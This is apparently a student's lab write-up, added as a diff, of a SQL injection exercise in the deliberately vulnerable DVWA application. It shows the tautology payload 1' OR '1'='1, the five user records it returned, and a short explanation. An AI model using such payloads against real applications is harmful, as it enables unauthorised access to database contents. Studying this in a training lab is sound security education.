@@ -1,0 +1,21 @@
+For input- 1' OR '1'='1
+output-
+ID: 1' OR '1'='1
+First name: admin
+Surname: admin
+ID: 1' OR '1'='1
+First name: Gordon
+Surname: Brown
+ID: 1' OR '1'='1
+First name: Hack
+Surname: Me
+ID: 1' OR '1'='1
+First name: Pablo
+Surname: Picasso
+ID: 1' OR '1'='1
+First name: Bob
+Surname: Smith
+
+I opened the SQL Injection section in DVWA and kept the security level at Low. I entered the payload `1' OR '1'='1` in the input field. The application returned multiple user records instead of showing only one result. This showed that the 
+        input was not properly handled and could be used to access database                          information. I saved a screenshot of the payload and the result as evidence.
+
